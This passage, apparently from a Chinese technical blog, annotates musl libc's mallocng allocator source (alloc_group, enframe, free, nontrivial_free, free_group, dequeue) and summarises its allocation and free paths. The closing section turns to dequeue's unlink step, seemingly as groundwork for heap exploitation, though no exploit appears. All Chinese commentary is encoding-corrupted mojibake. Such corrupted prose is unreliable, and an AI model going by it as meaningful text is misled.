&amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line"><span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line"><span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line"><span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">req += IB + UNIT;</span><br><span class="line">req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">cnt = <span class="number">1</span>;</span><br><span class="line">needed = req;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">free_meta(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="comment">// ä»å¤§ group ä¸­ç”³è¯·å° groupï¼Œå¤§ group çš„ chunk ä½œä¸ºæ•´ä¸ªå° groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹</span></span><br><span class="line"><span class="type">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">free_meta(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¢åŠ å¯ç”¨ chunk ä¸ªæ•°</span></span><br><span class="line">ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ– meta å’Œ group</span></span><br><span class="line">m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">m-&gt;mem = (<span class="type">void</span> *)p;</span><br><span class="line">m-&gt;mem-&gt;meta = m;</span><br><span class="line">    <span class="comment">// group çš„ active_idx å’Œ meta çš„ last_idx ä¸€èˆ¬æ˜¯ç›¸ç­‰çš„ï¼Œä¸º cnt-1</span></span><br><span class="line">m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">m-&gt;sizeclass = sc;</span><br><span class="line"><span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="emframe"><a href="#emframe" class="headerlink" title="emframe"></a>emframe</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// è·å– chunk å¤§å°</span></span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="comment">// è®¡ç®— chunk å¤šä½™ç©ºé—´</span></span><br><span class="line"><span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line"><span class="comment">// p æŒ‡å‘ chunk çš„ data èµ·å§‹ä½ç½®</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check */</span></span><br><span class="line"><span class="comment">// p[-3] = chunk_idx</span></span><br><span class="line"><span class="comment">// *(uint16_t *)(p-2) = chunk_offset</span></span><br><span class="line"><span class="comment">// å– chunk çš„ offsetï¼Œä¸€èˆ¬ä¸º 0</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line"><span class="type">size_t</span> m = slack;</span><br><span class="line">m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">off &amp;= m;</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line"><span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">p += UNIT*off;</span><br><span class="line"><span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line"><span class="comment">// byte, so make one.</span></span><br><span class="line">p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// è®¾ç½® offset å’Œ idx</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br><span class="line"><span class="comment">// è®¾ç½® reserved</span></span><br><span class="line">set_size(p, end, n);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h3><p>ä»¥ä¸‹ä¸ºä¸€èˆ¬æƒ…å†µçš„æµç¨‹ï¼Œçœç•¥äº†ç‰¹æ®Šæƒ…å†µ</p><ol><li><strong>æ£€æŸ¥ç”³è¯·çš„ size</strong><ul><li>å¦‚æœ size è¾¾åˆ°éœ€è¦ mmap çš„é˜ˆå€¼<ol><li>ç›´æ¥è°ƒç”¨ mmapï¼Œè¿”å›çš„åœ°å€ä½œä¸º group</li><li>è·å–å¹¶åˆå§‹åŒ– meta<ul><li>last_idx = 0ï¼Œåªæœ‰ä¸€ä¸ª chunkï¼Œå› æ­¤å®ƒä¸ä¼šå† ctx.active ä¸­</li><li>sizeclass = 63</li><li>maplen = (size + 4 + 0x10 + 4095) / 4096</li><li>avail_mask = freed_mask = 0</li><li>ctx.mmap_counter++</li></ul></li><li>è¿›å…¥ success</li></ol></li><li>æ²¡æœ‰åˆ™è°ƒç”¨ <code>size_to_class</code> å°† size è®¡ç®—ä¸ºå¯¹åº”çš„ scï¼ˆsizeclassï¼‰</li></ul></li><li><strong>è·å–å¯¹åº”çš„ meta</strong><ol><li>å– sc å¯¹åº”å¤§å°çš„å¯åˆ†é…çš„ metaï¼ˆctx.active[sc])</li><li>è‹¥ä¸å­˜åœ¨æ»¡è¶³ä¸‹åˆ—æ‰€æœ‰æ¡ä»¶ä¼šå–ç¨å¤§ä¸€ç‚¹çš„ meta<ul><li>4&lt;= sc &lt;32</li><li>sc != 6</li><li>sc ä¸ºå¶æ•°</li><li>å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0ï¼ˆæ²¡æœ‰å¯¹åº”å¤§å°çš„ metaï¼‰</li></ul></li></ol></li><li><strong>è·å– chunk çš„ idx</strong><ol><li>å– meta çš„ç¬¬ä¸€ä¸ª avail_chunk<ul><li>è‹¥ avail_chunk å­˜åœ¨<ol><li>å°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶</li><li>è¿›å…¥ success</li></ol></li></ul></li><li>è¿›å…¥ <code>alloc_slot</code> è¿›è¡Œè¿›ä¸€æ­¥ç”³è¯·<ol><li>è°ƒç”¨ <code>try_avail</code> å°è¯• ctx.active[sc] é“¾è¡¨ä¸­çš„æ‰€æœ‰ meta<ol><li>æ£€æŸ¥ç¬¬ä¸€ä¸ª meta çš„ freed_mask<ul><li>è‹¥ freed_mask ä¸º 0ï¼Œä¼šè°ƒç”¨ **<code>dequeue</code>**ï¼Œå°†å…¶ç§»é™¤ ctx.active[sc]</li><li>å› ä¸ºç¬¬ä¸€ä¸ª meta æ²¡æœ‰ unuse_chunk</li></ul></li><li>å°†ä¸‹ä¸€ä¸ª meta åˆ‡æ¢ä¸ºç¬¬ä¸€ä¸ª metaï¼ˆctx.active[sc] = m-&gt;next)</li><li>å°† meta çš„ freed_mask è½¬ä¸º avail_mask</li><li>å– meta çš„ç¬¬ä¸€ä¸ª avail_chunkï¼Œå°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶</li><li>è¿”å›ç¬¬ä¸€ä¸ª avail_chunk å¯¹åº”çš„ avail_mask ä½ç½®</li><li><strong>æ³¨</strong>ï¼šä¸‹ä¸€ä¸ª meta å¯èƒ½æ˜¯å®ƒè‡ªå·±ï¼ˆå¾ªç¯ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ unused_maskï¼Œæœ€ç»ˆä¼šè¿”å› 0</li></ol></li><li>å¦‚æœ <code>try_avail</code> è¿”å› 0ï¼Œä¼šè°ƒç”¨ <code>alloc_group</code> ç”³è¯·ä¸€ä¸ªæ–°çš„ group<ol><li>å…ˆè°ƒç”¨ <code>alloc_meta</code> ç”³è¯·ä¸€ä¸ª metaï¼Œä¼˜å…ˆå– freed_meta å†ä» meta_area ä¸­å–æ–°çš„</li><li>æ–°çš„ group ä¸€èˆ¬å–æ›´å¤§çš„ chunk ä½œä¸ºæ•´ä¸ª groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹</li><li>meta çš„ avail_mask å‡ä¸€ï¼Œå³ä½¿ç”¨ç¬¬ä¸€ä¸ª chunk</li><li>è°ƒç”¨ <code>queue</code> å°† meta æ”¾å…¥ ctx.active[sc]</li></ol></li></ol></li></ol></li><li><strong>è¿›å…¥ success</strong><ul><li>è°ƒç”¨ <code>enframe</code> å¯¹ chunk åˆå§‹åŒ–</li><li>(unsigned char*) p[-3] = idx</li><li>*(uint16_t) (p - 2) = offset</li><li>è®¾ç½® reserved</li></ul></li></ol><h3 id="æ€»ç»“ç®€å•ç‰ˆ"><a href="#æ€»ç»“ç®€å•ç‰ˆ" class="headerlink" title="æ€»ç»“ç®€å•ç‰ˆ"></a>æ€»ç»“ç®€å•ç‰ˆ</h3><p><strong>åˆ†é… chunk é¡ºåº</strong></p><ol><li>ctx.active[sc] -&gt; avail_mask<ul><li>malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ avail_chunk</li></ul></li><li>ctx.active[sc] -&gt; next -&gt; freed_mask<ul><li>malloc_context.active å¯¹åº”å¤§å°çš„ meta çš„ ä¸‹ä¸€ä¸ª meta ä¸­çš„ freed_chunk</li><li>å¦‚æœ ctx.active[sc] çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™ä¼šè°ƒç”¨ **<code>dequeue</code>**ï¼Œå°†å…¶ç§»å‡º active å’Œé“¾è¡¨</li><li>å…ˆæŠŠ freed_mask è½¬ä¸º avail_maskï¼Œç„¶åå°† ctx.active[sc] è®¾ä¸ºè¯¥ meta</li></ul></li><li>ctx.active[sc] -&gt; freed_mask<ul><li>malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ freed_chunk</li></ul></li><li>new_meta -&gt; avail_mask<ul><li>ç”³è¯·ä¸€ä¸ªæ–°çš„ metaï¼Œå–å…¶ avail_chunk</li></ul></li></ol><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line"><span class="comment">// æ£€æŸ¥ reserved</span></span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line"><span class="comment">// idx å’Œ reserved ç½® 0xffï¼Œoffset ç½® 0</span></span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line"><span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line"><span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunkï¼Œåˆ™è·³å‡ºå¾ªç¯</span></span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå…¶ä»– chunk éƒ½ä¸æ˜¯ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunk åˆ™ä¼š è¿›å…¥ nontrivial_free</p><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free"></a>nontrivial_free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸€èˆ¬æƒ…å†µï¼Œåªè¦æ‰€æœ‰ chunk éƒ½æ˜¯ unuseï¼Œå°±ä¼š free meta å’Œ group</span></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="comment">// å°†ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk</span></span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="comment">// å¦‚æœ meta ä¸åœ¨ active é‡Œï¼Œåˆ™æ”¾å…¥ actvie ä¸­</span></span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// g-&gt;freed_mask = g-&gt;free_mask &amp; self</span></span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk<ol><li>å°†è¯¥ meta ä» active å’Œé“¾è¡¨ä¸­ç§»é™¤</li><li>å°†é“¾è¡¨çš„ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk</li><li>free è¯¥ meta å’Œ group</li></ol></li><li>æ²¡æœ‰ freed_chunk<ol><li>å°†è¯¥ meta æ’å…¥ active çš„é“¾è¡¨å°¾éƒ¨</li></ol></li></ul><h3 id="free-group"><a href="#free-group" class="headerlink" title="free_group"></a>free_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">mi = nontrivial_free(m, idx);</span><br><span class="line">&#125;</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“ä¸€ä¸‹-1"><a href="#æ€»ç»“ä¸€ä¸‹-1" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h3><ol><li>è·å– chunk çš„ metaã€idxã€sc</li><li>æ£€æŸ¥ reserved</li><li>idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶</li><li>æ£€æŸ¥ avail_mask å’Œ freed_mask<ul><li>è‹¥å­˜åœ¨ freed_chunk ä¸”æœ‰å…¶ä»–çš„ inuse_chunk<ul><li>å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1</li><li>ç»“æŸ <code>free</code> å‡½æ•°</li></ul></li><li>å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥</li></ul></li><li>è°ƒç”¨ <code>nontrivial_free</code> å‡½æ•°åšè¿›ä¸€æ­¥å¤„ç†<ol><li>å¦‚æœæ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk<ul><li>å¦‚æœ meta çš„ next å­˜åœ¨ï¼Œè°ƒç”¨ <strong><code>dequeue</code></strong> å°† meta ä» ctx.active[sc] ä¸­ç§»å‡º</li><li>free æ‰ meta å’Œ group</li><li>ç»“æŸ <code>free</code> å‡½æ•°</li></ul></li><li>å¦‚æœå…¶ä»– chunk éƒ½æ˜¯ inuse_chunk ä¸” meta ä¸åœ¨ ctx.artive[sc] ä¸­<ul><li>è°ƒç”¨ <code>queue</code> å°† meta æ”¾å…¥ ctx.active[sc]</li></ul></li><li>å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1</li></ol></li></ol><h2 id="å…³é”®"><a href="#å…³é”®" class="headerlink" title="å…³é”®"></a>å…³é”®</h2><h3 id="dequeue-1"><a href="#dequeue-1" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡ 